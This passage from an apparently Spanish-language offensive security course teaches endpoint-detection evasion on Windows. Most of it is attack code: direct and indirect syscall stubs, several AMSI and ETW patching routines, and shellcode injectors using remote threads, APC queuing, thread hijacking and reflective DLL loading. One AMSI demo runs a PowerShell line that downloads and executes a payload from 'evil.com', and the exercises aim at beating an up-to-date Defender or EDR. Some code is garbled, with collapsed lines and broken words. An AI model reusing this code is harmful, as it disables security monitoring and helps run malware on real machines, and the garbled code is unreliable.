SysWhispers2 es una herramienta que genera codigo [asm](../raw/4ss3mbly-f0r-h4ck3rs.md) para hacer direct syscalls. Proporciona un archivo .[asm](../raw/4ss3mbly-f0r-h4ck3rs.md) y .h con las funciones necesarias.

```bash
# Uso de SysWhispers2
git clone https://github.com/jthuraisamy/SysWhispers2
cd SysWhispers2
python syswhispers.py --functions NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls
```

**Esto genera:**
- `syscalls.asm`: Codigo [assembly](../raw/4ss3mbly-f0r-h4ck3rs.md) de las syscalls
- `syscalls.h`: Cabeceras C de las funciones

**syscalls.asm (generado):**
```asm
.code

EXTERN SW2_GetSyscallNumber:DWORD

NtCreateThreadEx PROC mov [rsp+8], rcx mov [rsp+10h], rdx mov [rsp+18h], r8 mov [rsp+20h], r9 sub rsp, 28h mov ecx, 0C7h call SW2_GetSyscallNumber add rsp, 28h mov r10, rcx syscall ret
NtCreateThreadEx ENDP

NtAllocateVirtualMemory PROC mov [rsp+8], rcx mov [rsp+10h], rdx mov [rsp+18h], r8 mov [rsp+20h], r9 sub rsp, 28h mov ecx, 0h call SW2_GetSyscallNumber add rsp, 28h mov r10, rcx syscall ret
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC mov [rsp+8], rcx mov [rsp+10h], rdx mov [rsp+18h], r8 mov [rsp+20h], r9 sub rsp, 28h mov ecx, 3Ah call SW2_GetSyscallNumber add rsp, 28h mov r10, rcx syscall ret
NtWriteVirtualMemory ENDP
```

**Uso en C:**
```c
#include <windows.h>
#include "syscalls.h"

int main { HANDLE hProcess = NULL; CLIENT_ID cid; OBJECT_ATTRIBUTES oa; InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL); // Usar direct syscall en vez de API hookeada cid.UniqueProcess = (HANDLE)1234; // PID target cid.UniqueThread = 0; NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid); LPVOID remoteBuffer = NULL; SIZE_T size = 4096; NtAllocateVirtualMemory(hProcess, &remoteBuffer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); BYTE shellcode = { /* .. */ }; NtWriteVirtualMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL); HANDLE hThread = NULL; NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteBuffer, NULL, 0, 0, 0, 0, NULL); WaitForSingleObject(hThread, INFINITE); return 0;
}
```

### 3.6 SysWhispers3

SysWhispers3 mejora SysWhispers2 con soporte para indirect syscalls y randomizacion del stack.

```bash
python syswhispers.py --preset all -o syscalls
```

### 3.7 Direct Syscalls en ASM [x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64)

A veces necesitas escribir tu propio ASM cuando SysWhispers no cubre tu caso:

```asm
; asm_syscalls.asm
.code

; Prototipo: NTSTATUS NtAllocateVirtualMemory(
; HANDLE ProcessHandle,
; PVOID* BaseAddress,
; ULONG_PTR ZeroBits,
; PSIZE_T RegionSize,
; ULONG AllocationType,
; ULONG Protect
; );
InternalNtAllocateVirtualMemory PROC mov [rsp+8], rcx ; Save arguments mov [rsp+10h], rdx mov [rsp+18h], r8 mov [rsp+20h], r9 sub rsp, 28h ; Allocate shadow space mov eax, 18h ; Syscall number (varies by build) mov r10, rcx ; Second arg for syscall syscall ; Transition to kernel add rsp, 28h ; Restore stack ret
InternalNtAllocateVirtualMemory ENDP

InternalNtWriteVirtualMemory PROC mov [rsp+8], rcx mov [rsp+10h], rdx mov [rsp+18h], r8 mov [rsp+20h], r9 sub rsp, 28h mov eax, 3Ah mov r10, rcx syscall add rsp, 28h ret
InternalNtWriteVirtualMemory ENDP

InternalNtCreateThreadEx PROC mov [rsp+8], rcx mov [rsp+10h], rdx mov [rsp+18h], r8 mov [rsp+20h], r9 sub rsp, 28h mov eax, 0C7h mov r10, rcx syscall add rsp, 28h ret
InternalNtCreateThreadEx ENDP

InternalNtOpenProcess PROC mov [rsp+8], rcx mov [rsp+10h], rdx mov [rsp+18h], r8 mov [rsp+20h], r9 sub rsp, 28h mov eax, 26h mov r10, rcx syscall add rsp, 28h ret
InternalNtOpenProcess ENDP

END
```

### 3.8 Indirect Syscalls

Indirect syscalls mejoran las direct syscalls al redirigir la ejecucion a traves de ntdll.dll para evitar deteccion por stack trace.

```asm
; En vez de ejecutar syscall directamente:
syscall

; Usamos un JMP a la instruccion syscall dentro de ntdll.dll:
; Encontramos una funcion en ntdll.dll que tenga un syscall cerca del final
; y saltamos directamente a la instruccion syscall

; Pseudocodigo:
; 1. Encontrar una funcion en ntdll.dll que termine con syscall
; 2. Copiar el setup de registros (mov r10, rcx; mov eax, XX)
; 3. En vez de ejecutar syscall, saltar a la instruccion syscall de ntdll
```

```asm
; Indirect syscall implementation
IndirectSyscall PROC ; Setup registers para la syscall mov r10, rcx mov eax, SYSCALL_NUMBER ; Saltar a la instruccion syscall dentro de ntdll.dll ; (previamente resuelta) jmp QWORD PTR [syscallAddress]
IndirectSyscall ENDP
```

### 3.9 Randomizando la Instruccion SYSENTER/SYSCALL

Para evitar deteccion basada en patrones, podemos randomizar como se ejecuta la syscall:

```c
// Randomizar entre syscall, sysenter, o int 2Eh
DWORD useMethod = rand % 3;

switch (useMethod) { case 0: // syscall (x64) asm volatile("syscall"); break; case 1: // int 2Eh asm volatile("int $0x2E"); break; case 2: // sysenter (mas comun en x86) asm volatile("sysenter"); break;
}
```

### 3.10 Ejercicio Practico: Direct Syscall

**Escenario:** Necesitas ejecutar shellcode en un proceso remoto pero no podes usar las APIs hookeadas.

**Tarea:** Implementar un loader que use direct syscalls para NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, y NtCreateThreadEx.

**Pistas:**
1. Usa Hell's Gate para obtener los syscall numbers.
2. Escribe el assembly para cada syscall.
3. Compila el .asm con MASM (ml64.exe).
4. Linkea el .obj con tu programa C.
5. Prueba el loader contra un EDR.

---

## 4. [amsi](../raw/3dr-3v4s10n.md#amsi) Patching

### 4.1 Que es AMSI?

AMSI (Antimalware Scan Interface) es una interfaz de Windows que permite a las aplicaciones enviar contenido a cualquier antivirus instalado para que lo escanee. Fue introducido en Windows 10.

**componentes de AMSI:**
- `amsi.dll`: DLL que expone las APIs
- `AmsiScanBuffer`: Escanea un buffer de datos
- `AmsiScanString`: Escanea un string
- `AmsiInitialize`: Inicializa la sesion
- `AmsiOpenSession`: Abre una sesion de escaneo

### 4.2 AMSI y [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)

PowerShell usa AMSI extensivamente. Cada script, comando, o string que se evalua, pasa por AMSI.

```powershell
# Esto va a ser escaneado por AMSI
Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```

AMSI en PowerShell:
1. PowerShell llama a `AmsiScanBuffer` para cada script bloque
2. AMSI pasa el buffer al antivirus (Windows Defender por defecto)
3. Si el antivirus detecta algo malicioso, AMSI devuelve `AMSI_RESULT_DETECTED`
4. PowerShell bloquea la ejecucion

### 4.3 Memory Patching de AmsiScanBuffer

La tecnica mas comun de bypass: parchar AmsiScanBuffer en memoria para que siempre devuelva `AMSI_RESULT_CLEAN`.

```c
// AmsiPatch.c
#include <windows.h>
#include <stdio.h>

void PatchAmsi { HMODULE hAmsi = LoadLibraryA("amsi.dll"); if (!hAmsi) { printf("Error cargando amsi.dll\n"); return; } LPVOID amsiScanBuffer = (LPVOID)GetProcAddress(hAmsi, "AmsiScanBuffer"); if (!amsiScanBuffer) { printf("Error obteniendo AmsiScanBuffer\n"); return; } printf("AmsiScanBuffer en: 0x%p\n", amsiScanBuffer); // Parche: hacer que AmsiScanBuffer retorne E_INVALIDARG (0x80070057) // o AMSI_RESULT_CLEAN inmediatamente BYTE patch = { 0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (E_INVALIDARG) 0xC3 // ret }; // Alternativa: devolver AMSI_RESULT_CLEAN BYTE patchClean = { 0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, 0 (AMSI_RESULT_CLEAN) 0xC3 // ret }; // Alternativa: retornar inmediatamente (mas simple) BYTE patchRet = { 0x31, 0xC0,  // xor eax, eax (eax = 0 = AMSI_RESULT_CLEAN) 0xC3 // ret }; DWORD oldProtect; VirtualProtect(amsiScanBuffer, sizeof(patchRet), PAGE_EXECUTE_READWRITE, &oldProtect); memcpy(amsiScanBuffer, patchRet, sizeof(patchRet); VirtualProtect(amsiScanBuffer, sizeof(patchRet), oldProtect, &oldProtect); printf("AMSI parcheado exitosamente!\n");
}

int main { printf("=== AMSI Patching Demo ===\n\n"); PatchAmsi; printf("\nAHORA podes ejecutar PowerShell sin restricciones!\n"); system("powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""); return 0;
}
```

### 4.4 [amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass) via Hardware Breakpoints

Usando hardware breakpoints para interceptar AmsiScanBuffer y cambiar el resultado:

```c
// Usar vectored exception handler + hardware breakpoints
LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS pExceptionInfo) { if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) { // Estamos en AmsiScanBuffer // Cambiar el resultado a AMSI_RESULT_CLEAN pExceptionInfo->ContextRecord->Rax = 0; // AMSI_RESULT_CLEAN // Modificar el return address para saltar el resto de la funcion // .. return EXCEPTION_CONTINUE_EXECUTION; } return EXCEPTION_CONTINUE_SEARCH;
}

void AmsiBypassHardwareBP { AddVectoredExceptionHandler(1, VectoredHandler); // Poner hardware breakpoint en AmsiScanBuffer HMODULE hAmsi = LoadLibraryA("amsi.dll"); LPVOID amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer"); CONTEXT ctx; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS; GetThreadContext(GetCurrentThread, &ctx); // Dr0 con la direccion de AmsiScanBuffer ctx.Dr0 = (ULONG_PTR)amsiScanBuffer; ctx.Dr7 = 0x1; // Enable Dr0 on code execution SetThreadContext(GetCurrentThread, &ctx);
}
```

### 4.5 AMSI Bypass via Registry

Deshabilitar AMSI via registro (requiere admin):

```powershell
# Deshabilitar AMSI via registro
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\AMSI" -Name "Enable" -Value 0 -Type DWord

# O para el proveedor de Defender
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\AMSI" -Name "Enable" -Value 0 -Type DWord
```

### 4.6 AMSI Bypass via DLL Sideloading

Si podes poner un `amsi.dll` falso en el PATH, Windows lo cargara en vez del real:

```c
// amsi_dll_fake.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { if (fdwReason == DLL_PROCESS_ATTACH) { DisableThreadLibraryCalls(hinstDLL); // Devolver AMSI_RESULT_CLEAN siempre // Al ser un placeholder, AmsiScanBuffer no existe // pero podemos exportarlo } return TRUE;
}

// Exportar funciones AMSI que siempre devuelven clean
__declspec(dllexport) HRESULT AmsiScanBuffer(..) { return 0; // AMSI_RESULT_CLEAN
}

__declspec(dllexport) HRESULT AmsiScanString(..) { return 0;
}

__declspec(dllexport) HRESULT AmsiInitialize(..) { return S_OK;
}
```

### 4.7 AMSI Bypass via [com](../raw/w1n-s9bsyst3ms.md#com)

```powershell
# Bypass AMSI via COM
[Runtime.InteropServices.Marshal]::WriteInt32( [Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate( [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer( (nint)[Runtime.InteropServices.Marshal]::GetComInterfaceForObject( [Runtime.InteropServices.Marshal]::GetTypedObjectForIUnknown( [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation").EntryPoint, [type] ), [type] ) ) ).GetFunctionPointer.ToInt64 + 0x10, 0
)
```

### 4.8 AMSI Bypass en .NET (System.Management.Automation)

```csharp
// AmsiBypass.cs
using System;
using System.Runtime.InteropServices;

class AmsiBypass
{ [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); static void PatchAmsi { IntPtr amsi = GetModuleHandle("amsi.dll"); if (amsi == IntPtr.Zero) amsi = LoadLibrary("amsi.dll"); IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer"); if (amsiScanBuffer == IntPtr.Zero) return; byte patch = new byte { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret VirtualProtect(amsiScanBuffer, (uint)patch.Length, 0x40, out uint oldProtect); Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length); VirtualProtect(amsiScanBuffer, (uint)patch.Length, oldProtect, out _); } static void Main { PatchAmsi; Console.WriteLine("AMSI parcheado!"); }
}
```

### 4.9 Implementacion en PowerShell

```powershell
# AmsiBypass.ps1 - Multiple tecnicas
function Bypass-AMSI { Write-Host "[*] Intentando bypass de AMSI.." -ForegroundColor Cyan # Tecnica 1: Parchar en memoria try { $amsi = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE("amsi.dll") $buffer = [System.Runtime.InteropServices.Marshal]::GetProcAddress($amsi, "AmsiScanBuffer") # xor eax, eax; ret $patch = [byte]@(0x31, 0xC0, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $buffer, 3) Write-Host "[+] Tecnica 1 exitosa (Memory Patch)" -ForegroundColor Green return } catch { Write-Host "[-] Tecnica 1 fallo: $_" -ForegroundColor Red } # Tecnica 2: Forzar error en AMSI try { $Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru $handle = [Win32Functions.Win32]::LoadLibrary("amsi.dll") $address = [Win32Functions.Win32]::GetProcAddress($handle, "AmsiScanBuffer") $old = 0 [Win32Functions.Win32]::VirtualProtect($address, [UIntPtr]::new(3), 0x40, [ref]$old) $patch = [byte]@(0x31, 0xC0, 0xC3) # xor eax,eax; ret [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $address, 3) Write-Host "[+] AMSI Bypass exitoso!" -ForegroundColor Green } catch { Write-Host "[-] Todos los bypasses fallaron" -ForegroundColor Red }
}

# Llamar al bypass
Bypass-AMSI

# Probar
Write-Host "[*] Probando con Invoke-Mimikatz.." -ForegroundColor Yellow
Invoke-Mimikatz # Esto deberia funcionar si AMSI esta parcheado
```

### 4.11 Ejercicio Practico: AMSI Bypass

**Escenario:** Estas en una maquina con Windows Defender y necesitas ejecutar un script de PowerShell ofensivo.

**Tarea:** Crear un bypass de AMSI que funcioniones)e contra Windows Defender actualizado.

**Pistas:**
1. Prueba el memory patch de AmsiScanBuffer.
2. Si Defender detecta el patch, implementa hardware breakpoints.
3. otra opcion: usar reflection .NET para parchar indirectamente.
4. Prueba el bypass con: `Invoke-Expression "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484e1380"`

---

## 5. [etw](../raw/3dr-3v4s10n.md#etw) Patching

### 5.1 Que es ETW?

ETW (Event Tracing for Windows) es un sistema de tracing integrado en Windows. permite a las aplicaciones y al [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) generar eventos que los consumidores pueden recolectar.

**componentes ETW:**
- **Providers:** Generan eventos (ej: Microsoft-Windows-Kernel-Process)
- **Consumers:** Consumen eventos (ej: EDR, Process Monitor)
- **Channels:** Canales de eventos
- **Session:** Sesion de tracing

### 5.2 Event Tracing for Windows: Arquitectura Interna

Los EDRs usan ETW como fuente de telemetria. Windows genera eventos ETW para:

- Creacion de procesos
- Carga de DLLs
- Acceso al registro
- Actividad de [red](../raw/r3d3s-f0nd4m3nt0s.md)
- Etc.

Si un atacante deshabilita ETW, el EDR pierde una fuente importante de informacion.

### 5.3 EDRs y ETW

Muchos EDRs dependen de ETW para detectar actividades:

- **Microsoft Defender:** Usa ETW para deteccion de comportamiento
- **CrowdStrike:** Usa ETW events como fuente de datos
- **SentinelOne:** Consume eventos ETW ademas de su [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers)

### 5.4 Patching de EtwEventWrite

La funcioniones) clave es `EtwEventWrite` en `ntdll.dll`. Si la parcheamos para que siempre retorne 0 (success), los eventos ETW no se generan.

```c
// PatchEtw.c
#include <windows.h>
#include <stdio.h>

BOOL PatchETW { HMODULE ntdll = GetModuleHandleA("ntdll.dll"); if (!ntdll) { printf("Error cargando ntdll.dll\n"); return FALSE; } // Encontrar EtwEventWrite LPVOID etwEventWrite = (LPVOID)GetProcAddress(ntdll, "EtwEventWrite"); if (!etwEventWrite) { // Podria llamarse diferente en algunas versiones etwEventWrite = (LPVOID)GetProcAddress(ntdll, "EtwEventWriteFull"); } if (!etwEventWrite) { printf("Error obteniendo EtwEventWrite\n"); return FALSE; } printf("EtwEventWrite en: 0x%p\n", etwEventWrite); // Parche: retornar 0 (success) inmediatamente BYTE patch = { 0x31, 0xC0,  // xor eax, eax (eax = 0) 0xC3 // ret }; // Alternativa: saltar al final de la funcion // Para evitar que se note un parche de solo 3 bytes DWORD oldProtect; if (!VirtualProtect(etwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect) { printf("Error cambiando proteccion: %d\n", GetLastError); return FALSE; } memcpy(etwEventWrite, patch, sizeof(patch); DWORD temp; VirtualProtect(etwEventWrite, sizeof(patch), oldProtect, &temp); printf("ETW parcheado exitosamente!\n"); return TRUE;
}

int main { printf("=== ETW Patching Demo ===\n\n"); if (PatchETW) { printf("\nEventos ETW silenciados!\n"); } return 0;
}
```

### 5.6 ETW Bypass via .NET

```csharp
// EtwBypass.cs
using System;
using System.Runtime.InteropServices;

class EtwBypass
{ [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); public static void Patch { IntPtr ntdll = GetModuleHandle("ntdll.dll"); IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite"); if (etwEventWrite == IntPtr.Zero) { Console.WriteLine("[-] No se encontro EtwEventWrite"); return; } // Parche completo (ret al inicio) byte patch = new byte { 0x48, 0x33, 0xC0, // xor rax, rax 0xC3 // ret }; VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, 0x40, out uint oldProtect); Marshal.Copy(patch, 0, etwEventWrite, patch.Length); VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, oldProtect, out _); Console.WriteLine("[+] ETW parcheado!"); }
}
```

### 5.7 Ejercicio Practico: ETW Bypass

**Escenario:** Un EDR esta usando ETW para detectar tus actividades.

**Tarea:** Implementar un bypass de ETW completo que tambien evite la deteccion del parche.

**Pistas:**
1. Parchar EtwEventWrite para retornar 0.
2. Si el EDR detecta 3 bytes de patch, intenta parchar EtwEventWriteFull tambien.
3. Usa hardware breakpoints en vez de memory patching para ser mas sigiloso.
4. Verifica que el bypass funciona con: `logman start -ets test -o test.etl -p Microsoft-Windows-Kernel-Process`

---

## 6. [process injection](../raw/3dr-3v4s10n.md#process-injection)

### 6.1 Fundamentos de Process Injection

Process injection es la tecnica de ejecutar codigo en el espacio de direcciones de otro [proceso](../raw/0s-f0nd4m3nt0s.md#procesos). Esto permite:
- Evadir deteccion (el codigo malicioso corre dentro de un proceso legitimo)
- Elevar privilegios (inyectar en un proceso con mas privilegios)
- persistenciaia)

**APIs clave para injection:**
- `OpenProcess` / `NtOpenProcess`: Abrir un proceso target
- `VirtualAllocEx` / `NtAllocateVirtualMemory`: Asignar memoria en el proceso target
- `WriteProcessMemory` / `NtWriteVirtualMemory`: Escribir datos en el proceso target
- `CreateRemoteThread` / `NtCreateThreadEx`: Crear un thread en el proceso target

### 6.2 CreateRemoteThread

La tecnica mas basica y conocida:

```c
// CreateRemoteThread injection
#include <windows.h>
#include <stdio.h>

unsigned char shellcode = { 0x90, 0x90, 0x90, 0xCC  // NOP NOP NOP INT3 (placeholder)
};

int main { DWORD pid = 1234; // PID del proceso target HANDLE hProcess = NULL; printf("=== CreateRemoteThread Injection ===\n\n"); // 1. Abrir proceso target hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (!hProcess) { printf("Error: No se pudo abrir proceso %d (code: %d)\n", pid, GetLastError); return 1; } printf("[+] Proceso %d abierto\n", pid); // 2. Asignar memoria en el proceso target LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!remoteBuffer) { printf("Error: No se pudo asignar memoria remota (code: %d)\n", GetLastError); CloseHandle(hProcess); return 1; } printf("[+] Memoria asignada en: 0x%p\n", remoteBuffer); // 3. Escribir shellcode en la memoria remota SIZE_T bytesWritten = 0; if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), &bytesWritten) { printf("Error: No se pudo escribir en memoria remota (code: %d)\n", GetLastError); VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE); CloseHandle(hProcess); return 1; } printf("[+] %zu bytes escritos en memoria remota\n", bytesWritten); // 4. Crear thread remoto HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); if (!hThread) { printf("Error: No se pudo crear thread remoto (code: %d)\n", GetLastError); VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE); CloseHandle(hProcess); return 1; } printf("[+] Thread remoto creado! PID: %d, TID: %d\n", pid, GetThreadId(hThread); // Esperar a que termine WaitForSingleObject(hThread, INFINITE); // Limpiar VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE); CloseHandle(hThread); CloseHandle(hProcess); printf("[+] Inyeccion completada\n"); return 0;
}
```

### 6.3 QueueUserAPC

APC (Asynchronous Procedure Call) injection: en vez de crear un thread, encolamos un APC en un thread existente.

```c
// APC Injection
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD FindThread(DWORD pid) { HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hSnapshot == INVALID_HANDLE_VALUE) return 0; THREADENTRY32 te; te.dwSize = sizeof(THREADENTRY32); if (Thread32First(hSnapshot, &te) { do { if (te.th32OwnerProcessID == pid) { CloseHandle(hSnapshot); return te.th32ThreadID; } } while (Thread32Next(hSnapshot, &te); } CloseHandle(hSnapshot); return 0;
}

int main { DWORD targetPid = 1234; printf("=== APC Injection ===\n\n"); // 1. Abrir proceso target HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid); if (!hProcess) { printf("Error abriendo proceso\n"); return 1; } // 2. Asignar memoria y escribir shellcode BYTE shellcode = { /* .. */ }; LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL); // 3. Encontrar un thread del proceso target DWORD threadId = FindThread(targetPid); if (!threadId) { printf("Error: No se encontraron threads en el proceso\n"); return 1; } HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId); if (!hThread) { printf("Error abriendo thread: %d\n", GetLastError); return 1; } // 4. Encolar APC QueueUserAPC(PAPCFUNC)remoteBuffer, hThread, NULL); printf("[+] APC encolado en thread %d\n", threadId); printf("[+] Se ejecutara cuando el thread entre en alertable state\n"); CloseHandle(hThread); CloseHandle(hProcess); return 0;
}
```

### 6.4 setThreadContext

Tambien conocido como "thread hijacking" o "early bird injection":

```c
// Early Bird APC Injection
#include <windows.h>
#include <stdio.h>

int main { printf("=== Early Bird APC Injection ===\n\n"); // 1. Crear proceso suspendido STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi); printf("[+] Proceso suspendido creado: %d\n", pi.dwProcessId); // 2. Asignar memoria en el proceso target BYTE shellcode = { /* .. */ }; LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL); // 3. Encolar APC QueueUserAPC(PAPCFUNC)remoteBuffer, pi.hThread, NULL); // 4. Reanudar el proceso ResumeThread(pi.hThread); printf("[+] Proceso reanudado, APC se ejecutara cuando entre en alertable state\n"); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;
}
```

### 6.5 ThreadHijacking

Secuestrar un thread existente: suspendemos un thread, cambiamos su contexto (Rip) apuntando a nuestro shellcode, y lo reanudamos.

```c
// Thread Hijacking
#include <windows.h>
#include <stdio.h>

int main { printf("=== Thread Hijacking ===\n\n"); DWORD targetPid = 1234; DWORD targetTid = 5678; // 1. Abrir proceso y thread HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid); HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid); if (!hProcess || !hThread) { printf("Error abriendo proceso/thread\n"); return 1; } // 2. Asignar memoria y escribir shellcode BYTE shellcode = { /* .. */ }; LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL); // 3. Suspender el thread SuspendThread(hThread); // 4. Obtener contexto del thread CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL; GetThreadContext(hThread, &ctx); // 5. Guardar el RIP original (para restaurar despues si queremos) ULONG_PTR originalRip = ctx.Rip; // 6. Cambiar RIP a nuestro shellcode ctx.Rip = (DWORD64)remoteBuffer; ctx.ContextFlags = CONTEXT_CONTROL; SetThreadContext(hThread, &ctx); // 7. Reanudar el thread ResumeThread(hThread); printf("[+] Thread hijacking completado!\n"); CloseHandle(hThread); CloseHandle(hProcess); return 0;
}
```

### 6.7 Reflective [dll injection](../raw/3dr-3v4s10n.md#dll-injection)

Carga un DLL directamente desde memoria, sin usar LoadLibrary. El DLL mismo se encarga de cargarse.

```c
// ReflectiveLoader.c - Parte del DLL
#include <windows.h>

__declspec(dllexport) BOOL WINAPI ReflectiveLoader { // Encontrar el kernel32.dll // Cargar kernel32.dll en memoria (si es necesario) // Encontrar funciones necesarias (LoadLibraryA, GetProcAddress, etc.) // Cargar dependencias del DLL // Resolver imports del DLL // Aplicar relocations // Inicializar secciones TLS // Llamar a DllMain del DLL return TRUE;
}
```

**Loader del Reflective DLL Injection:**
```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv) { printf("=== Reflective DLL Injection ===\n\n"); // 1. Leer el DLL de disco HANDLE hFile = CreateFileA("evil.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); DWORD fileSize = GetFileSize(hFile, NULL); LPVOID dllData = HeapAlloc(GetProcessHeap, 0, fileSize); ReadFile(hFile, dllData, fileSize, &fileSize, NULL); CloseHandle(hFile); DWORD targetPid = atoi(argv[1]); // 2. Abrir proceso target HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid); // 3. Escribir el DLL en la memoria del target LPVOID remoteDll = VirtualAllocEx(hProcess, NULL, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, remoteDll, dllData, fileSize, NULL); // 4. Encontrar la funcion ReflectiveLoader dentro del DLL // (calcular offset) DWORD loaderOffset = /* offset de ReflectiveLoader en el DLL */; LPVOID remoteLoader = (LPVOID)(ULONG_PTR)remoteDll + loaderOffset); // 5. Crear thread remoto apuntando a ReflectiveLoader HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteLoader, remoteDll, 0, NULL); WaitForSingleObject(hThread, INFINITE); printf("[+] Reflective DLL cargado!\n"); HeapFree(GetProcessHeap, 0, dllData); CloseHandle(hThread); CloseHandle(hProcess); return 0;
}
```

### 6.11 Implementacion en Nim

```nim
# process_injection.nim
import winim

